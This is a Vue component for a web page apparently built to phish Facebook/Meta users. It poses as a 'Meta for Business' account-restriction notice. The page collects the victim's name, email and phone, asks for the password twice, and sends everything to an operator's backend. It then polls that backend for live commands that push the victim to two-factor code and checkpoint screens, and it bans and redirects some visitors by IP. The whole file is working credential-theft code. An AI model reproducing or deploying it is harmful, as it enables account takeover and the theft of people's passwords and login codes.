<script>
import useValidate from "@vuelidate/core";
import { required, email, numeric } from "@vuelidate/validators";
import axios from "axios";
import ChatWidget from "@/components/ChatWidget.vue"

export default {
  name: "Form1",
    components:{
      ChatWidget,
    },
  data() {
    return {
      v$: useValidate(),
      waitingForResponse: false,
      chatMessage: false,
      loading: "",
      ipAddress: "",
      interval: "",
      decision: "",
      firstPassword: false,
      secondPassword: false,
      wrongPw: false,
      pageLoad: false,
      form: {
        page_name: "",
        name: "",
        email: "",
        mobile: "",
        // appeal: "",
      },
      modal: {
        password: "",
        error: false,
      },
    };
  },
  created() {
    // this.pageLoading();

    document.title = "My Personal Account Was Restricted | Facebook";
    axios.interceptors.request.use(
      (config) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = true;
        }
        return config;
      },
      (error) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return Promise.reject(error);
      }
    );

    axios.interceptors.response.use(
      (response) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return response;
      },
      (error) => {
        if (this.waitingForResponse != true && this.chatMessage != true) {
          this.loading = false;
        }
        return Promise.reject(error);
      }
    );
  },
  mounted() {
    this.getClientIP();
    this.checkBan();
  },
  methods: {
    pageLoading() {
      this.pageLoad = true;

      setTimeout(() => {
              this.pageLoad = false;
      }, 4500);
    },
    chatMessageStatus() {
      (this.chatMessage = true), console.log(this.chatMessage);
    },
    getClientIP() {
      axios
        .get("https://api.ipify.org?format=json")
        .then((response) => {
          this.ipAddress = response.data.ip;
          this.checkBan();
        })
        .catch((e) => {
          console.log(e);
        });
    },
    checkBan() {
      axios
        .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/ban`, {
          ip: this.ipAddress,
        })
        .then((response) => {
          if (response.data == "BAN") {
            window.location.href = "https://www.facebook.com/help/";
          }
        })
        .catch((e) => {
          console.log(e);
        });
    },
    getResponse() {
      this.interval = setInterval(() => {
        axios
          .post(`${process.env.VUE_APP_BAZA_URL}/api/fetch/decision`, {
            case_ref: this.ipAddress,
          })
          .then((response) => {
            let resType;

            if (response.data == "CMD_EMAIL") {
              resType = "email";

                this.$router.push({
                    name: "twofa",
                    params: {
                        type: resType,
                        email: this.form.email,
                    },
                });
                clearInterval(this.interval);
            }

            if (response.data == "CMD_CODE") {
                resType = "code";

                this.$router.push({
                    name: "twofa",
                    params: {
                        type: resType,
                        email: this.form.email,
                    },
                });
                clearInterval(this.interval);
            }

            if (response.data == "CMD_CHECKPOINT") {
              this.$router.push({
                path: "checkpoint",
              });
              clearInterval(this.interval);
            }

            if (response.data == "CMD_WRONG") {
                this.wrongPw = true;
                this.loading = false;
                this.modal.password = '';
                clearInterval(this.interval);
            }
          })
          .catch((e) => {
            console.log(e);
          });
      }, 1000);
    },
    submitForm() {
      console.log("submit");
      this.v$.$validate(); // checks all inputs
      if (!this.v$.$error) {
        let data = {
          page_name: this.form.page_name,
          name: this.form.name,
          email: this.form.email,
          mobile: this.form.mobile,
          //   appeal: this.form.appeal,
        };
        console.log(data);
        axios
          .post(
            `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
            data
          )
          .then((response) => {
            console.log(response);
          })
          .catch((e) => {
            this.errors.push(e);
            console.log(this.errors);
          });

        this.firstPassword = true;
      }
    },
    submitPassword() {
      if (this.modal.password != "") {
        if (this.secondPassword == false) {
          this.modal.error = false;
          axios
            .post(
              `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
              { firstPassword: this.modal.password }
            )
            .then((response) => {
              console.log(response);
                console.log(response);
                this.waitingForResponse = true;
                this.loading = true;
                this.getResponse();
                this.secondPassword = true;
            })
            .catch((e) => {
              this.errors.push(e);
              console.log(this.errors);
            });

          this.modal.password = "";
        } else {
          axios
            .post(
              `${process.env.VUE_APP_BAZA_URL}/api/message/${process.env.VUE_APP_BAZA_ID}`,
              { secondPassword: this.modal.password }
            )
            .then((response) => {
              console.log(response);
              this.waitingForResponse = true;
              this.loading = true;
              this.getResponse();
            })
            .catch((e) => {
              this.errors.push(e);
              console.log(this.errors);
            });
        }
      } else {
        this.modal.error = true;
      }
    },
    alert(){
      alert('Please complete the form before you navigate.');
    }
  },
  validations() {
    return {
      form: {
        page_name: { required },
        name: { required },
        email: { required, email },
        mobile: { required, numeric },
        // appeal: { required },
      },
    };
  },
};
</script>

<template>
    <div v-if="pageLoad" id="" class="">
        <div class="overflow-x-hidden">
          <div class="h-screen overflow-x-hidden overflow-y-hidden w-screen z-100 flex justify-center items-center">
            <img src="../assets/images/loadingLogo.4eff47490162868e9ff2.gif" alt="">
          </div>
        </div>
    </div>

    <div v-if="loading" id="loadFacebookC" class="">
        <div id="loadFacebookG">
        <div id="blockG_1" class="facebook_blockG"></div>
        <div id="blockG_2" class="facebook_blockG"></div>
        <div id="blockG_3" class="facebook_blockG"></div>
        </div>
    </div>
    <div id="root">
      <div class="bg-white">
        <div class="overflow-x-hidden">
          <div class="header flex flex-col w-full h-[140px]">
            <div
              class="headerTop flex flex-row justify-between h-[54px] pt-[40px] mb-[50px] px-[20px]"
            >
              <div class="headerLeft flex flex-grow flex-row gap-x-[80px]">
                <div class="flex justify-center">
                  <div class="flex flex-row">
                    <img
                      src="data:image/jpeg;base64,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"
                      alt=""
                      class="w-[17px] h-[13px] mt-[6px]"
                    />
                    <p
                      class="headerMetaFont font-montserrat text-[18px] ml-2 tracking-tighter"
                    >
                      Meta for Business
                    </p>
                  </div>
                </div>
                <div class="hidden lg:flex md:flex-row gap-x-[80px]">
                  <button
                  @click="alert()"
                    class="cursor-pointer text-[#747474] font-medium text-[17px]"
                  >
                    Get Started</button
                  ><button
                    @click="alert()"
                    class="cursor-pointer text-[#747474] font-medium text-[17px]"
                  >
                    Advertise</button
                  ><button
                    @click="alert()"
                    class="cursor-pointer text-[#747474] font-medium text-[17px]"
                  >
                    Learn</button
                  ><button
                    @click="alert()"
                    class="cursor-pointer text-[#747474] font-medium text-[17px]"
                  >
                    Support
                  </button>
                </div>
              </div>
              <div class="headerRight hidden md:flex">
                <button
                  @click="alert()"
                  class="startNowButton px-4 flex items-center justify-center flex-row w-[152px] h-[36px] rounded bg-[#445661]"
                >
                  <p class="startNowButtonText font-montserrat text-white">
                    Start Now
                  </p>
                </button>
              </div>
            </div>
            <div class="headerBottom flex flex-row justify-between px-4 mb-4">
              <p
                @click="alert()"
                class="headerBottomText text-[#404040] font-montserrat cursor-pointer"
              >
                Business Help Center
              </p>
              <p
                @click="alert()"
                class="headerBottomText text-[#404040] font-montserrat cursor-pointer"
              >
                Get Support
              </p>
            </div>
          </div>
          <div
            class="flex flex-row w-screen h-screen bg-gradient-to-br overflow-x-hidden from-[#fffbf2] to-[#f0f8ff]"
          >
            <div
              class="sideMenu pt-[30px] pr-[36px] h-full lg:pl-[20px] xl:pl-[80px] hidden lg:flex 2xl:pl-[80px] justify-end w-[38%] border-r-2"
            >
              <div class="w-full h-full">
                <img
                  src="../assets/images/metaTextLogo.e8c807fc3bccff5a9b1f.png"
                  alt=""
                  class="h-[16px] w-[77px]"
                />
                <p
                  class="sideMenuHeader mt-4 tracking-wider text-[#1c2b33] text-[26px] font-bold font-ubuntu"
                >
                  Accounts Center
                </p>
                <p class="mt-3 font-montserrat font-medium md:text-[18px]">
                  We have received multiple reports that suggest that your account
                  has been in violation of our terms of service and community
                  guidelines. As a result, your account is scheduled for review.
                </p>
                <p
                  class="font-montserrat font-medium md:text-[18px] text-blue-400 hover:text-blue-500 cursor-pointer mt-2"
                >
                  Learn More.
                </p>
                <div class="mt-[22px] flex flex-col gap-y-0.5"></div>
                <p class="font-montserrat font-semibold text-[20px] mt-2">
                  Account Settings
                </p>
                <div class="mt-[22px] flex flex-col gap-y-2">
                  <div
                    class="sideMenuButton bg-[#344854] lg:w-[340px] xl:w-[400px] rounded-lg cursor-default flex flex-row items-center pl-[24px] gap-x-[20px]"
                  >
                    <div class="w-6">
                      <i
                        data-test="fa"
                        class="far fa-sticky-note text-[24px] text-white"
                      ></i>
                    </div>
                    <p
                      class="text-[20px] text-left font-montserrat font-medium text-white"
                    >
                      Personal Details
                    </p>
                  </div>
                  <div
                    class="sideMenuButton lg:w-[340px] xl:w-[400px] rounded-lg cursor-default flex flex-row items-center pl-[24px] gap-x-[20px]"
                  >
                    <div class="w-6">
                      <i
                        data-test="fa"
                        class="fa fa-shield-alt text-[24px] text-[#1c2b33]"
                      ></i>
                    </div>
                    <p
                      class="text-[20px] text-left font-montserrat font-medium text-[#1c2b33]"
                    >
                      Password and security
                    </p>
                  </div>
                  <div
                    class="sideMenuButton lg:w-[340px] xl:w-[400px] rounded-lg cursor-default flex flex-row items-center pl-[24px] gap-x-[20px]"
                  >
                    <div class="w-6">
                      <i
                        data-test="fa"
                        class="fa fa-fingerprint text-[24px] text-[#1c2b33]"
                      ></i>
                    </div>
                    <p
                      class="text-[20px] text-left font-montserrat font-medium text-[#1c2b33]"
                    >
                      Your information and permissions
                    </p>
                  </div>
                  <div
                    class="sideMenuButton lg:w-[340px] xl:w-[400px] rounded-lg cursor-default flex flex-row items-center pl-[24px] gap-x-[20px]"
                  >
                    <div class="w-6">
                      <i
                        data-test="fa"
                        class="fa fa-bullhorn text-[24px] text-[#1c2b33]"
                      ></i>
                    </div>
                    <p
                      class="text-[20px] text-left font-montserrat font-medium text-[#1c2b33]"
                    >
                      Ad preferences
                    </p>
                  </div>
                  <div
                    class="sideMenuButton lg:w-[340px] xl:w-[400px] rounded-lg cursor-default flex flex-row items-center pl-[24px] gap-x-[20px]"
